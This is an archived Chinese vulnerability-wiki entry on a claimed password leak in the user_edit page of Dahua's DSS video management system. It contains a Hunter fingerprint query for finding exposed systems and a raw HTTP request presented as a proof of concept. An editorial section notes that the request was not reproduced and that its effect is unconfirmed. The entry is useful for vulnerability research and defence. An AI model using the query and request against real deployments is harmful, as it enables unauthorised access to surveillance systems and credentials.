---
source: "wy876 漏洞文库"
id: "vw-09de5e0fec6f12f27b591bb5"
entity_id: "ve-09de5e0fec6f12f27b591bb5"
schema_version: "1"
title: "大华 DSS 视频管理系统user_edit存在密码泄漏漏洞"
product: "大华DSS视频管理软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "带两个JSESSIONID；账号角色/软件版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8EDSS%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fuser_edit%E5%AD%98%E5%9C%A8%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gsq90pf8xgsyfgix"
source_status: "recorded"
previous_fofa_unverified: "app.name=="
hunter: "app.name==\"Dahua 大华 DSS 视频管理系统\""
---

# 大华 DSS 视频管理系统user_edit存在密码泄漏漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华DSS视频管理软件
- 本文讨论：cascade_/user_edit.action id=1凭据泄露
- 版本、权限与配置前提：带两个JSESSIONID；账号角色/软件版本未知
- 资料类型：密码泄露PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 重复同名会话Cookie来源不清；没有响应/泄漏字段，可能正常管理员编辑页需明授权边界
- 未区分密码明文/哈希/掩码，不能保证拿到可登录凭据
- 版本/修复缺失，Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 匿名/低权限是否可读及凭据类型待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
DSS是大华的大型监控管理应用平台，支持几乎所有涉及监挂控等方面的操作，支持多级跨平台联网等操作。可将视频监控、卡口拍照、区间测速、电子地图、违章查询系统等诸多主流应用整合在一起，实现更加智能、便捷的分级查询服务。大华 DSS 视频管理系统user_edit存在密码泄漏漏洞。

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```http
GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=1B1D0EBCE3AC082FDBA00062678EAAC9; JSESSIONID=48C3365B18E192DAAB020C90A2BF0DEF
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsq90pf8xgsyfgix>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
